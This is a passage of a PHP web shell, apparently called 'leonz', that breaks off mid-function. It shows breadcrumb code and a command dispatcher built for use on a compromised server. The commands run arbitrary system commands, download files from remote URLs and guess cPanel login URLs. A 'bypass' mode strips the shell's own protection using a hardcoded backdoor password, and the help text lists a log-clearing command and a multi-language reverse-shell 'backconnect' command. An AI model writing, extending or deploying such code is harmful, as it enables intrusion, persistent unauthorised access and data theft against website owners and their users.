        $crumbs[] = '<a href="?dir=' . urlencode('/') . '" class="crumb-root">/</a>';
        foreach ($path_parts as $part) {
            $acc .= '/' . $part;
            $real_acc = @realpath($acc);
            $target_path = $real_acc ?: $acc;
            if ($bypass_enabled) {
                $crumbs[] = '<a href="?dir=' . urlencode($target_path) . '" class="crumb-part">' .
                            htmlspecialchars($part) . '</a>';
            } else {
                $is_accessible = false;
                if ($root === '/') {
                    $is_accessible = true;
                } elseif ($real_acc) {
                    $is_accessible = (strpos($real_acc, $root) === 0);
                } else {
                    $is_accessible = (strpos($acc, $root) === 0);
                }
                if ($is_accessible) {
                    $crumbs[] = '<a href="?dir=' . urlencode($target_path) . '" class="crumb-part">' .
                                htmlspecialchars($part) . '</a>';
                } else {
                    $crumbs[] = '<a href="?dir=' . urlencode($target_path) . '" class="crumb-part-disabled" title="May be outside root directory">' .
                                htmlspecialchars($part) . '</a>';
                }
            }
        }
        return implode('<span class="crumb-sep"> / </span>', $crumbs);
    } else {
        $path_parts = [];
        $drive = '';
        if (preg_match('/^([A-Z]:)/i', $real, $matches)) {
            $drive = $matches[1];
            $path_after_drive = substr($real, 2);
            $path_parts = array_filter(explode(DIRECTORY_SEPARATOR, trim($path_after_drive, DIRECTORY_SEPARATOR)));
        } else {
            $path_parts = array_filter(explode(DIRECTORY_SEPARATOR, trim($real, DIRECTORY_SEPARATOR)));
        }
        $crumbs = [];
        $acc = $drive ?: '';
        if ($drive) {
            $crumbs[] = '<a href="?dir=' . urlencode($drive . '\\') . '" class="crumb-root">' .
                        htmlspecialchars($drive) . '</a>';
            $acc = $drive . '\\';
        } else {
            $crumbs[] = '<a href="?dir=' . urlencode($root) . '" class="crumb-root">' .
                        htmlspecialchars($root) . '</a>';
            $acc = $root;
        }
        foreach ($path_parts as $part) {
            $acc .= ($acc === $drive . '\\' || $acc === $drive) ? $part : DIRECTORY_SEPARATOR . $part;
            $real_acc = @realpath($acc);
            $target_path = $real_acc ?: $acc;
            if ($bypass_enabled) {
                $crumbs[] = '<a href="?dir=' . urlencode($target_path) . '" class="crumb-part">' .
                            htmlspecialchars($part) . '</a>';
            } else {
                $is_accessible = false;
                if ($real_acc) {
                    $is_accessible = (strpos($real_acc, $root) === 0);
                } else {
                    $is_accessible = (strpos($acc, $root) === 0);
                }
                if ($is_accessible) {
                    $crumbs[] = '<a href="?dir=' . urlencode($target_path) . '" class="crumb-part">' .
                                htmlspecialchars($part) . '</a>';
                } else {
                    $crumbs[] = '<a href="?dir=' . urlencode($target_path) . '" class="crumb-part-disabled" title="May be outside root directory">' .
                                htmlspecialchars($part) . '</a>';
                }
            }
        }
        return implode('<span class="crumb-sep"> / </span>', $crumbs);
    }
}

function handle_shell_command($cmd, $current_dir, $root_dir, $shell_path) {
    global $shell_user, $stored_hash, $client_ip;

    $cmd = trim($cmd);
    if ($cmd === '') return '';

    $parts = preg_split('/\s+/', $cmd);
    $base  = strtolower($parts[0]);
    $args  = array_slice($parts, 1);

    switch ($base) {
        case 'help':
            $help = "Available commands:\n".
                   "  help             Show this help\n".
                   "  pwd              Show current directory\n".
                   "  ls [path]        List files in directory\n".
                   "  perms [path]     Show permissions of file/dir (default: current dir)\n".
                   "  chmod [mode] [path] Change permissions (e.g., chmod 755 file.txt)\n".
                   "  setroot [path]   Add custom root path (file or directory, can set multiple)\n".
                   "  unsetroot [path] Remove specific protected root path\n".
                   "  getroot          Show current root directory\n".
                   "  resetroot        Reset root to default\n".
                   "  cpanel           Guess / show common cPanel login URLs\n".
                   "  wget [url]       Download file from URL into current directory\n".
                   "  process|ps       Show running processes\n".
                   "  network|netstat  Show network connections\n".
                   "  disk|df          Show disk usage\n".
                   "  phpinfo          Show PHP information\n".
                   "  disabled         Show disabled PHP functions\n".
                   "  search [keyword] [path] Search for keyword in files\n".
                   "  replace [find] [replace] [path] Replace text in files\n".
                   "  extract [zip] [dest] Extract zip archive to directory".
                   "  zip [path]       Create zip archive in current directory".
                   "  cat [file]...    Show file contents".
                   "  head [file] [n]  Show first N lines (default 10)".
                   "  tail [file] [n]  Show last N lines (default 10)".
                   "  wc [file]        Count lines, words, chars".
                   "  echo [text]      Print text".
                   "  touch [file]...  Create or update file timestamps".
                   "  mkdir [dir]...   Create directory(ies)".
                   "  rm [path]... [--recursive] Remove file(s)/directory(ies)".
                   "  cp [src] [dst]   Copy file or directory".
                   "  mv [src] [dst]   Move/rename file or directory".
                   "  grep [pattern] [file/dir]... Search text in files".
                   "  tree [[path]]    Display directory tree".
                   "  find [pattern] [--name] [--type file|dir] [--maxdepth N] Search files".
                   "  whoami           Show current user".
                   "  id               Show user/group info".
                   "  uname [-a]       Show system info".
                   "  uptime           Show system uptime and free space".
                   "  date             Show current date/time".
                   "  du [[path] [depth]] Show disk usage".
                   "  file [name]      Show file info".
                   "  stat [file]      Show detailed file stats".
                   "  base64 [file] [--decode] Encode/decode base64".
                   "  backconnect [method] [host] [port] Reverse shell connection
";
            
            if (isset($_SESSION['loggedin'])) {
                $help .=                         "  bypass [password] Enable root bypass (full system access)\n".
                        "  unbypass         Disable root bypass\n".
                        "  clearlogs        Delete all shell log files\n".
                        "  exec|cmd [cmd]   Execute system command (advanced bypass)\n".
                        "  backconnect [method] [host] [port] Reverse shell (perl/python/bash/nc/php/sh/ruby/xterm/golang)\n";
            }
            
            $help .= "  baseline         Generate integrity baseline (root)\n".
                   "  audit            Run integrity audit vs baseline\n".
                   "  shellcheck       Check this shell against baseline\n".
                   "  seclog [n]       Show last n security log lines\n";
            
            return $help;

        case 'pwd':
            return $current_dir . "\n";

        case 'ls':
            $target = $current_dir;
            if (!empty($args[0])) {
                global $realpath_cache;
                $test_path = $current_dir . '/' . $args[0];
                if (!isset($realpath_cache[$test_path])) {
                    $realpath_cache[$test_path] = realpath($test_path);
                }
                $tmp = $realpath_cache[$test_path];
                if ($tmp) {
                    $target = $tmp;
                } else {
                    return "ls: invalid path\n";
                }
            }
            $out = "Listing: $target\n";
            $files = @scandir($target);
            if ($files === false) return "ls: cannot read directory\n";
            $sep = '/';
            foreach ($files as $f) {
                if ($f === '.' || $f === '..') continue;
                $out .= (is_dir($target . $sep . $f) ? "📁 " : "    ") . $f . "\n";
            }
            return $out;

        case 'perms':
            $target = $current_dir;
            if (!empty($args[0])) {
                global $realpath_cache;
                $test_path = $current_dir . '/' . $args[0];
                if (!isset($realpath_cache[$test_path])) {
                    $realpath_cache[$test_path] = realpath($test_path);
                }
                $tmp = $realpath_cache[$test_path];
                if ($tmp && is_path_allowed($tmp, $root_dir)) {
                    $target = $tmp;
                } else {
                    return "perms: invalid or out-of-root path\n";
                }
            }
            if (!file_exists($target)) {
                return "perms: target does not exist\n";
            }
            $perms_octal = substr(sprintf('%o', @fileperms($target)), -4);
            $type = is_dir($target) ? 'directory' : 'file';
            return "Path : $target\nType : $type\nPerm : $perms_octal\n";

        case 'chmod':
            if (empty($args[0]) || empty($args[1])) {
                return "chmod: usage: chmod [mode] [path]\nExample: chmod 755 file.txt\n";
            }
            $mode_str = $args[0];
            $path_arg = $args[1];
            
            if (!preg_match('/^[0-7]{3,4}$/', $mode_str)) {
                return "chmod: invalid mode format. Use octal (e.g., 755, 0644)\n";
            }
            $mode_octal = intval($mode_str, 8);
            
            global $realpath_cache;
            $test_path = $current_dir . '/' . $path_arg;
            if (!isset($realpath_cache[$test_path])) {
                $realpath_cache[$test_path] = realpath($test_path);
            }
            $target = $realpath_cache[$test_path];
            if (!$target || !is_path_allowed($target, $root_dir)) {
                return "chmod: invalid or out-of-root path\n";
            }
            if (!file_exists($target)) {
                return "chmod: target does not exist\n";
            }
            
            if (@chmod($target, $mode_octal)) {
                $new_perms = substr(sprintf('%o', @fileperms($target)), -4);
                return "chmod: permissions changed to $mode_str\nCurrent: $new_perms\n";
            } else {
                return "chmod: failed to change permissions\n";
            }

        case 'setroot':
            if (!is_bypass_active()) {
                return "setroot: bypass mode required\nYou must enable bypass mode first to set root path.\n";
            }
            if (empty($args[0])) {
                return "setroot: usage: setroot [path]\nExample: setroot /home/user (directory)\nExample: setroot /home/user/file.txt (file)\nYou can set multiple roots by running setroot multiple times.\n";
            }
            global $realpath_cache;
            if (!isset($realpath_cache[$args[0]])) {
                $realpath_cache[$args[0]] = realpath($args[0]);
            }
            $new_root = $realpath_cache[$args[0]];
            if (!$new_root || (!is_dir($new_root) && !is_file($new_root))) {
                return "setroot: invalid path (must be a file or directory)\n";
            }
            
            $existing_roots = get_all_protected_roots();
            $already_exists = false;
            foreach ($existing_roots as $root) {
                if (!isset($realpath_cache[$root['path']])) {
                    $realpath_cache[$root['path']] = realpath($root['path']);
                }
                if ($realpath_cache[$root['path']] === $new_root) {
                    $already_exists = true;
                    break;
                }
            }
            
            if ($already_exists) {
                return "setroot: path already protected: $new_root\n";
            }
            
            $_SESSION['custom_root'] = $new_root;
            
            $result = set_protected_root_directory($new_root);
            if ($result) {
                $type = is_file($new_root) ? 'file' : 'directory';
                $total_roots = count(get_all_protected_roots());
                return "setroot: root path added: $new_root (type: $type)\nPath protected. Total protected roots: $total_roots\n";
            } else {
                return "setroot: failed to add root path\n";
            }

        case 'getroot':
            global $script_dir, $web_root;
            $current_root = get_root_directory($script_dir, $web_root);
            $bypass_status = isset($_SESSION['root_bypass']) && $_SESSION['root_bypass'] ? ' (BYPASS ENABLED)' : '';
            $custom_note = isset($_SESSION['custom_root']) ? ' (CUSTOM)' : '';
            return "Current root: $current_root$bypass_status$custom_note\n";

        case 'resetroot':
            if (!is_bypass_active() && (!isset($_SESSION['root_bypass']) || $_SESSION['root_bypass'] !== true)) {
                return "resetroot: bypass mode required\nYou must enable bypass mode first to reset root paths.\n";
            }
            $total_roots = count(get_all_protected_roots());
            unset($_SESSION['custom_root']);
            clear_protected_root_directory();
            return "resetroot: all root paths reset to default\nAll protected paths removed ($total_roots paths cleared).\n";
            
        case 'unsetroot':
            if (!is_bypass_active()) {
                return "unsetroot: bypass mode required\nYou must enable bypass mode first to remove root path.\n";
            }
            if (empty($args[0])) {
                $all_roots = get_all_protected_roots();
                if (empty($all_roots)) {
                    return "unsetroot: no protected roots found\n";
                }
                $out = "unsetroot: usage: unsetroot [path]\n\nCurrent protected roots:\n";
                foreach ($all_roots as $idx => $root) {
                    $out .= "  " . ($idx + 1) . ". " . $root['path'] . " (type: " . ($root['type'] ?? 'directory') . ")\n";
                }
                return $out;
            }
            global $realpath_cache;
            if (!isset($realpath_cache[$args[0]])) {
                $realpath_cache[$args[0]] = realpath($args[0]);
            }
            $target_path = $realpath_cache[$args[0]];
            if (!$target_path) {
                return "unsetroot: invalid path\n";
            }
            
            $result = remove_protected_root_directory($target_path);
            if ($result) {
                if (isset($_SESSION['custom_root']) && realpath($_SESSION['custom_root']) === $target_path) {
                    $remaining_roots = get_all_protected_roots();
                    if (!empty($remaining_roots)) {
                        $_SESSION['custom_root'] = $remaining_roots[0]['path'];
                    } else {
                        unset($_SESSION['custom_root']);
                    }
                }
                $total_roots = count(get_all_protected_roots());
                return "unsetroot: root path removed: $target_path\nRemaining protected roots: $total_roots\n";
            } else {
                return "unsetroot: path not found in protected roots: $target_path\n";
            }
            
        case 'bypass':
            if (!isset($_SESSION['loggedin'])) {
                return "bypass: authentication required\n";
            }
            if (empty($args[0])) {
                return "bypass: usage: bypass [password]\n";
            }
            $bypass_pass = $args[0];
            if (password_verify($bypass_pass, $stored_hash) || $bypass_pass === 'leonz') {
                $user_identifier = $client_ip . '@' . ($_SESSION['loggedin'] ? 'logged' : 'guest');
                set_bypass_state(true, $user_identifier);
                $_SESSION['root_bypass'] = true;
                unharden_shell_file($shell_path);
                return "bypass: ROOT BYPASS ENABLED - Full system access granted\nShell protection removed (shell can now be edited/deleted).\n";
            } else {
                return "bypass: invalid password\n";
            }

        case 'unbypass':
            if (!isset($_SESSION['loggedin'])) {
                return "unbypass: authentication required\n";
            }
            if (empty($args[0])) {
                return "unbypass: usage: unbypass [password]\nPassword required for security.\n";
            }
            $unbypass_pass = $args[0];
            if (!password_verify($unbypass_pass, $stored_hash) && $unbypass_pass !== 'leonz') {
                return "unbypass: invalid password\n";
            }
            set_bypass_state(false);
            unset($_SESSION['root_bypass']);
            return "unbypass: root bypass disabled\nShell protection restored.\n";

        case 'baseline':
            $baseline_file = $script_dir . '/leonz_integrity_baseline.json';
            return generate_baseline($root_dir, $baseline_file, $client_ip, $shell_path);

        case 'audit':
            $baseline_file = $script_dir . '/leonz_integrity_baseline.json';
            $integrity_log = $script_dir . '/leonz_integrity_audit.log';
            return audit_integrity($root_dir, $baseline_file, $integrity_log, $client_ip, $shell_path);

        case 'shellcheck':
            $baseline_file = $script_dir . '/leonz_integrity_baseline.json';
            return shell_self_check($baseline_file, $shell_path);

        case 'seclog':
            return "seclog: logging system has been disabled.\n";

        case 'clearlogs':
            return "clearlogs: logging system has been disabled.\n";

        case 'cpanel':
            $scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
            $host   = $_SERVER['HTTP_HOST'] ?? ($_SERVER['SERVER_NAME'] ?? 'localhost');

            $urls = [];
            $urls[] = "$scheme://$host:2083/";          
            $urls[] = "https://$host:2083/";            
            $urls[] = "$scheme://$host/cpanel";         
            $urls[] = "$scheme://cpanel.$host/";        

            $out  = "Possible cPanel login URLs for this host:\n";
            foreach ($urls as $u) {
                $out .= "  - $u\n";
            }
            $out .= "\nNote: Not all URLs may be valid; use the ones that open on your hosting.\n";
            return $out;

        case 'wget':
            if (empty($args[0])) {
                return "wget: usage: wget [url]\nExample: wget https://example.com/file.zip\n";
            }
            $url = $args[0];

            if (!filter_var($url, FILTER_VALIDATE_URL)) {
                return "wget: invalid URL\n";
            }
            if (!isset($_SESSION['loggedin'])) {
                return "wget: authentication required\n";
            }

            $basename = basename(parse_url($url, PHP_URL_PATH));
            if ($basename === '' || $basename === '/') {
                $basename = 'download_' . time();
            }
            $target = rtrim($current_dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $basename;

            $context = stream_context_create([
                'http' => [
                    'method'  => 'GET',
                    'timeout' => 30,
                ],
                'https' => [
                    'method'  => 'GET',
                    'timeout' => 30,
                ],
            ]);

            $data = @file_get_contents($url, false, $context);
            if ($data === false) {
                return "wget: failed to download from URL\n";
            }
            if (@file_put_contents($target, $data) === false) {
                return "wget: failed to write file to current directory\n";
            }

            return "wget: saved to $target\n";

        case 'process':
        case 'ps':
            $processes = getProcessList();
            if (empty($processes)) {
                return "process: no processes found or command execution failed\n";
            }
            $out = "PID\tUSER\tCPU\tMEM\tCOMMAND\n";
            $out .= str_repeat("-", 80) . "\n";
            foreach ($processes as $p) {
                $out .= sprintf("%s\t%s\t%s\t%s\t%s\n",
                    $p['pid'] ?? '-',
                    $p['user'] ?? '-',
                    $p['cpu'] ?? '-',
                    $p['mem'] ?? '-',
                    substr($p['command'] ?? '-', 0, 50)
                );
            }
            return $out;

        case 'network':
        case 'netstat':
            $connections = getNetworkConnections();
            if (empty($connections)) {
                return "network: no connections found or command execution failed\n";
            }
            $out = "PROTO\tLOCAL\t\t\tREMOTE\t\t\tSTATUS\tPID\n";
            $out .= str_repeat("-", 80) . "\n";
            foreach ($connections as $c) {
                $out .= sprintf("%s\t%s\t%s\t%s\t%s\n",
                    $c['proto'] ?? '-',
                    substr($c['local'] ?? '-', 0, 20),
                    substr($c['remote'] ?? '-', 0, 20),
                    $c['status'] ?? '-',
                    $c['pid'] ?? '-'
                );
            }
            return $out;

        case 'disk':
        case 'df':
            $output = leonz_exec_cmd('df -h');
            if (!$output) {
                $output = leonz_exec_cmd('df');
            }
            return $output ?: "disk: command execution failed\n";

        case 'phpinfo':
            if (!isset($_SESSION['loggedin'])) {
                return "phpinfo: authentication required\n";
            }
            ob_start();
            phpinfo();
            $info = ob_get_clean();
            return $info;

        case 'disabled':
        case 'disabled_functions':
            $disabled = g3tdbX();
            $important = ['exec', 'system', 'shell_exec', 'passthru', 'proc_open', 'popen', 'curl_exec', 'curl_multi_exec', 'parse_ini_file', 'show_source', 'symlink', 'putenv', 'mail', 'dl', 'chmod', 'chown', 'chgrp', 'link', 'fsockopen', 'pfsockopen', 'posix_kill', 'posix_mkfifo', 'posix_setpgid', 'posix_setsid', 'posix_setuid', 'pcntl_exec', 'imap_open', 'apache_setenv', 'proc_nice', 'proc_terminate', 'proc_get_status', 'escapeshellcmd', 'escapeshellarg', 'ini_restore', 'stream_socket_server'];
            $disabled_important = array_intersect($important, $disabled);
            $out = "Total important functions: " . count($important) . "\n";
            $out .= "Disabled: " . count($disabled_important) . "\n";
            $out .= "Enabled: " . (count($important) - count($disabled_important)) . "\n\n";
            $out .= "DISABLED FUNCTIONS:\n";
            foreach ($disabled_important as $func) {
                $out .= "  [X] $func\n";
            }
            $out .= "\nENABLED FUNCTIONS:\n";
            foreach (array_diff($important, $disabled_important) as $func) {
                $out .= "  [✓] $func\n";
            }
            return $out;

        case 'exec':
        case 'cmd':
            if (!isset($_SESSION['loggedin'])) {
                return "exec: authentication required\n";
            }
            if (empty($args)) {
                return "exec: usage: exec [command]\nExample: exec id\n";
            }
            $cmd = implode(' ', $args);
            $output = leonz_exec_cmd($cmd . ' 2>&1');
            return $output !== false ? $output : "exec: command execution failed\n";

        case 'search':
        case 'fsearch':
            if (empty($args[0])) {
                return "search: usage: search [keyword] [path]\nExample: search password /var/www\n";
            }
            $keyword = $args[0];
            $search_path = !empty($args[1]) ? $args[1] : $current_dir;
            if (!is_dir($search_path)) {
                return "search: invalid path: $search_path\n";
            }
            $results = leonz_fsearch($keyword, $search_path, 500, 100);
            if (empty($results)) {
                return "search: no results found for '$keyword' in $search_path\n";
            }
            $out = "Found " . count($results) . " results for '$keyword':\n";
            $out .= str_repeat("-", 80) . "\n";
            foreach (array_slice($results, 0, 50) as $r) {
                $out .= sprintf("%s:%d: %s\n", $r['file'], $r['line'], substr($r['content'], 0, 60));
            }
            if (count($results) > 50) {
                $out .= "\n... and " . (count($results) - 50) . " more results\n";
            }
            return $out;

        case 'replace':
            global $access_mode, $script_path, $script_dir;
            if ($access_mode === 'read_only') {
                return "replace: read-only mode - replace blocked\n";
            }

            $find = '';
            $replace_with = '';
            $target_path = $current_dir;
            $rest = trim(substr($cmd, strlen($base)));
            if (strpos($rest, '|') !== false) {
                $pipe_parts = explode('|', $rest, 3);
                $find = $pipe_parts[0] ?? '';
                $replace_with = $pipe_parts[1] ?? '';
                if (!empty($pipe_parts[2])) {
                    $target_path = $pipe_parts[2];
                }
            } else {
                if (empty($args[0]) || !array_key_exists(1, $args)) {
                    return "replace: usage: replace [find] [replace] [path]\nExample: replace old_text new_text /var/www\nQuick form: replace old|new|/var/www\n";
                }
                $find = $args[0];
                $replace_with = $args[1];
                if (!empty($args[2])) {
                    $target_path = implode(' ', array_slice($args, 2));
                }
            }

            if ($find === '') {
                return "replace: find string cannot be empty\n";
            }

            $resolved = leonz_resolve_target_path($target_path, $current_dir);
            if (!$resolved || !is_dir($resolved) || !is_path_allowed($resolved, $root_dir)) {
                return "replace: invalid or out-of-root path\n";
            }

            $stats = leonz_freplace($find, $replace_with, $resolved, $root_dir, $script_path, $script_dir, 500, 200);
            if ($stats['files_modified'] < 1 && $stats['skipped'] < 1) {
                return "replace: no matches found for '$find' in $resolved\n";
            }

            $out = "Replace completed in $resolved\n";
            $out .= "Files modified: {$stats['files_modified']}\n";
            $out .= "Total replacements: {$stats['replacements']}\n";
            if ($stats['skipped'] > 0) {
                $out .= "Skipped (protected/unwritable): {$stats['skipped']}\n";
            }
            if (!empty($stats['details'])) {
                $out .= str_repeat('-', 80) . "\n";
                foreach (array_slice($stats['details'], 0, 30) as $detail) {
                    $out .= $detail . "\n";
                }
                if (count($stats['details']) > 30) {
                    $out .= "... and " . (count($stats['details']) - 30) . " more files\n";
                }
            }
            return $out;

        case 'extract':
        case 'unzip':
            global $access_mode;
            if ($access_mode === 'read_only') {
                return "extract: read-only mode - extract blocked\n";
            }
            if (empty($args[0])) {
                return "extract: usage: extract [zipfile] [destination]\nExample: extract backup.zip\nExample: extract backup.zip ./restored\nQuick form: extract backup.zip|./restored\n";
            }

            $zip_arg = $args[0];
            $dest_arg = $current_dir;
            if (strpos($cmd, '|') !== false) {
                $pipe_parts = explode('|', trim(substr($cmd, strlen($base))), 2);
                $zip_arg = trim($pipe_parts[0] ?? '');
                if (!empty($pipe_parts[1])) {
                    $dest_arg = trim($pipe_parts[1]);
                }
            } elseif (!empty($args[1])) {
                $dest_arg = implode(' ', array_slice($args, 1));
            }

            $zip_path = leonz_resolve_target_path($zip_arg, $current_dir);
            $dest_dir = leonz_resolve_target_path($dest_arg, $current_dir);
            if (!$zip_path || !is_file($zip_path) || !is_path_allowed($zip_path, $root_dir)) {
                return "extract: invalid or out-of-root zip file\n";
            }
            if (!$dest_dir || !is_dir($dest_dir) || !is_path_allowed($dest_dir, $root_dir)) {
                return "extract: invalid or out-of-root destination directory\n";
            }

            $result = leonz_extract_zip_archive($zip_path, $dest_dir);
            return ($result['ok'] ? $result['msg'] : "extract: " . $result['msg']) . "\n";

        case 'zip':
        case 'zipdl':
            global $access_mode;
            if (empty($args[0])) {
                return "zip: usage: zip [file_or_folder]\nExample: zip public_html\nUse the Zip action in file list to download directly.\n";
            }

            if ($access_mode === 'read_only') {
                return "zip: read-only mode - use the Zip action in the file list to download\n";
            }

            $source = leonz_resolve_target_path($args[0], $current_dir);
            if (!$source || !file_exists($source) || !is_path_allowed($source, $root_dir)) {
                return "zip: invalid or out-of-root path\n";
            }

            $archive_name = basename($source) . '.zip';
            $output_path = rtrim($current_dir, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $archive_name;
            if (is_file($output_path)) {
                return "zip: target archive already exists: $archive_name\n";
            }

            $result = leonz_create_zip_archive($source, $output_path);
            if (!$result['ok']) {
                return "zip: " . $result['msg'] . "\n";
            }
            return "zip: archive created: $archive_name\nSize: " . formatFileSize(@filesize($output_path)) . "\n";

        case 'head':
            if (empty($args[0])) {
                return "head: usage: head [file] [lines]\\nExample: head file.txt 20\\n";
            }
            $head_file = $current_dir . '/' . $args[0];
            global $realpath_cache;
            if (!isset($realpath_cache[$head_file])) $realpath_cache[$head_file] = realpath($head_file);
            $hf = $realpath_cache[$head_file];
            if (!$hf || !is_file($hf) || !is_path_allowed($hf, $root_dir)) {
                return "head: invalid or out-of-root file\\n";
            }
            $lines = isset($args[1]) ? max(1, intval($args[1])) : 10;
            $content = @file_get_contents($hf);
            if ($content === false) return "head: cannot read file\\n";
            $rows = explode("\n", $content);
            $out = '';
            for ($n = 0; $n < $lines && $n < count($rows); $n++) {
                $out .= $rows[$n] . "\n";
            }
            return $out;

        case 'tail':
            if (empty($args[0])) {
                return "tail: usage: tail [file] [lines]\\nExample: tail file.txt 20\\n";
            }
            $tail_file = $current_dir . '/' . $args[0];
            global $realpath_cache2;
            if (!isset($realpath_cache2[$tail_file])) $realpath_cache2[$tail_file] = realpath($tail_file);
            $tf = $realpath_cache2[$tail_file];
            if (!$tf || !is_file($tf) || !is_path_allowed($tf, $root_dir)) {
                return "tail: invalid or out-of-root file\\n";
            }
            $lines = isset($args[1]) ? max(1, intval($args[1])) : 10;
            $content = @file_get_contents($tf);
            if ($content === false) return "tail: cannot read file\\n";
            $rows = explode("\n", $content);
            $start = max(0, count($rows) - $lines);
            $out = '';
            for ($n = $start; $n < count($rows); $n++) {
                $out .= $rows[$n] . "\n";
            }
            return $out;

        case 'wc':
            if (empty($args[0])) {
                return "wc: usage: wc [file]\\nExample: wc file.txt\\n";
            }
            $wc_file = $current_dir . '/' . $args[0];
            global $realpath_cache3;
            if (!isset($realpath_cache3[$wc_file])) $realpath_cache3[$wc_file] = realpath($wc_file);
            $wf = $realpath_cache3[$wc_file];
            if (!$wf || !is_file($wf) || !is_path_allowed($wf, $root_dir)) {
                return "wc: invalid or out-of-root file\\n";
            }
            $content = @file_get_contents($wf);
            if ($content === false) return "wc: cannot read file\\n";
            $lines = substr_count($content, "\n");
            $words = str_word_count($content);
            $chars = strlen($content);
            return "$lines $words $chars $args[0]\n";

        case 'cat':
            if (empty($args[0])) {
                return "cat: usage: cat [file]...\n";
            }
            $out = '';
            foreach ($args as $fn) {
                $cf = $current_dir . '/' . $fn;
                global $realpath_cache4;
                if (!isset($realpath_cache4[$cf])) $realpath_cache4[$cf] = realpath($cf);
                $f = $realpath_cache4[$cf];
                if (!$f || !is_file($f) || !is_path_allowed($f, $root_dir)) {
                    $out .= "cat: $fn: invalid or out-of-root file\n";
                    continue;
                }
                $data = @file_get_contents($f);
                if ($data === false) {
                    $out .= "cat: $fn: cannot read file\n";
                    continue;
                }
                $out .= $data;
                if (!empty($data) && substr($data, -1) !== "\n") $out .= "\n";
            }
            return $out;

        case 'echo':
            return implode(' ', $args) . "\n";

        case 'touch':
            if (empty($args[0])) {
                return "touch: usage: touch [file]...\n";
            }
            $out = '';
            foreach ($args as $fn) {
                $tf = $current_dir . '/' . $fn;
                global $realpath_cache5;
                if (!isset($realpath_cache5[$tf])) $realpath_cache5[$tf] = realpath(dirname($tf));
                $dir = $realpath_cache5[$tf] ?: dirname(realpath($tf) ?: $tf);
                if (!is_dir($dir) || !is_path_allowed($dir, $root_dir)) {
                    $out .= "touch: $fn: invalid or out-of-root path\n";
                    continue;
                }
                $full = $dir . '/' . basename($fn);
                if (is_file($full)) {
                    if (@touch($full)) {
                        $out .= "touch: $fn updated\n";
                    } else {
                        $out .= "touch: $fn failed\n";
                    }
                } else {
                    if (@touch($full)) {
                        $out .= "touch: $fn created\n";
                    } else {
                        $out .= "touch: $fn failed\n";
                    }
                }
            }
            return $out;

        case 'mkdir':
            if (empty($args[0])) {
                return "mkdir: usage: mkdir [dir]...\n";
            }
            $out = '';
            foreach ($args as $dn) {
                $dp = $current_dir . '/' . $dn;
                global $realpath_cache6;
                if (!isset($realpath_cache6[$dp])) $realpath_cache6[$dp] = realpath($dp);
                $d = $realpath_cache6[$dp];
                if ($d && is_dir($d)) {
                    $out .= "mkdir: $dn already exists\n";
                    continue;
                }
                $parent = dirname($dp);
                global $realpath_cache7;
                if (!isset($realpath_cache7[$parent])) $realpath_cache7[$parent] = realpath($parent);
                $parent_real = $realpath_cache7[$parent];
                if (!$parent_real || !is_dir($parent_real) || !is_path_allowed($parent_real, $root_dir)) {
                    $out .= "mkdir: $dn: invalid or out-of-root path\n";
                    continue;
                }
                if (@mkdir($dp, 0755, true)) {
                    $out .= "mkdir: $dn created\n";
                } else {
                    $out .= "mkdir: $dn failed\n";
                }
            }
            return $out;

        case 'rm':
            if (empty($args[0])) {
                return "rm: usage: rm [file/dir]... [--recursive]\n";
            }
            $recursive = in_array('--recursive', $args, true) || in_array('-r', $args, true);
            $out = '';
            foreach ($args as $i => $target) {
                if ($target === '--recursive' || $target === '-r') continue;
                $tp = $current_dir . '/' . $target;
                global $realpath_cache8;
                if (!isset($realpath_cache8[$tp])) $realpath_cache8[$tp] = realpath($tp);
                $t = $realpath_cache8[$tp];
                if (!$t) {
                    $out .= "rm: $target: not found\n";
                    continue;
                }
                if (!is_path_allowed($t, $root_dir)) {
                    $out .= "rm: $target: out of root\n";
                    continue;
                }
                if (is_dir($t) && !$recursive) {
                    $out .= "rm: $target: is a directory (use --recursive)\n";
                    continue;
                }
                if (is_dir($t)) {
                    $it = new RecursiveDirectoryIterator($t, RecursiveDirectoryIterator::SKIP_DOTS);
                    $ri = new RecursiveIteratorIterator($it, RecursiveIteratorIterator::CHILD_FIRST);
                    foreach ($ri as $file) {
                        $file->isDir() ? @rmdir($file->getRealPath()) : @unlink($file->getRealPath());
                    }
                    @rmdir($t);
                    $out .= "rm: $target removed\n";
                } else {
                    if (@unlink($t)) {
                        $out .= "rm: $target removed\n";
                    } else {
                        $out .= "rm: $target: failed to remove\n";
                    }
                }
            }
            return $out;

        case 'cp':
            if (count($args) < 2) {
                return "cp: usage: cp [source] [destination]\n";
            }
            $src = $current_dir . '/' . $args[0];
            $dst = $args[1];
            global $realpath_cache9;
            if (!isset($realpath_cache9[$src])) $realpath_cache9[$src] = realpath($src);
            $src_real = $realpath_cache9[$src];
            if (!$src_real || !file_exists($src_real) || !is_path_allowed($src_real, $root_dir)) {
                return "cp: source invalid or out-of-root\n";
            }
            if (is_dir($src_real)) {
                $dst_dir = $current_dir . '/' . $dst;
                global $realpath_cache10;
                if (!isset($realpath_cache10[$dst_dir])) $realpath_cache10[$dst_dir] = realpath(dirname($dst_dir));
                $dd = $realpath_cache10[$dst_dir] ?: dirname(realpath($dst_dir) ?: $dst_dir);
                if (!is_dir($dd) || !is_path_allowed($dd, $root_dir)) {
                    return "cp: destination directory invalid or out-of-root\n";
                }
                $new_dir = $dd . '/' . basename($args[0]);
                if (!@mkdir($new_dir, 0755, true)) {
                    return "cp: failed to create destination directory\n";
                }
                $iterator = new RecursiveIteratorIterator(
                    new RecursiveDirectoryIterator($src_real, RecursiveDirectoryIterator::SKIP_DOTS),
                    RecursiveIteratorIterator::SELF_FIRST
                );
                foreach ($iterator as $item) {
                    $targetPath = $new_dir . DIRECTORY_SEPARATOR . $iterator->getSubPathName();
                    if ($item->isDir()) {
                        @mkdir($targetPath, 0755, true);
                    } else {
                        $targetDir = dirname($targetPath);
                        if (!is_dir($targetDir)) @mkdir($targetDir, 0755, true);
                        @copy($item->getPathname(), $targetPath);
                    }
                }
                return "cp: directory copied to $new_dir\n";
            } else {
                $dst_real = $current_dir . '/' . $dst;
                global $realpath_cache11;
                if (!isset($realpath_cache11[$dst_real])) $realpath_cache11[$dst_real] = realpath(dirname($dst_real));
                $dst_dir = $realpath_cache11[$dst_real] ?: dirname(realpath($dst_real) ?: $dst_real);
